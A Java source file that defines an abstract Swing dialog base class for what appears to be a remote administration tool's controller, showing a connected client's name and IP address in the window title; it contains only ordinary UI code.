package io.jrat.controller.ui.dialogs;

import io.jrat.controller.Slave;
import javax.swing.JDialog;
import oslib.OperatingSystem;


@SuppressWarnings("serial")
public abstract class BaseDialog extends JDialog {

	protected Slave slave;
	
	public BaseDialog(Slave slave) {
		this.slave = slave;
	}

	@Override
	public void setVisible(boolean t) {
		super.setVisible(true);

		if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
			super.pack();
		}
	}
	
	public void setTitle(String s) {
		super.setTitle(s + " - [" + slave.getDisplayName() + "] - " + slave.getIP());
	}
	
	public Slave getSlave() {
		return slave;
	}

}
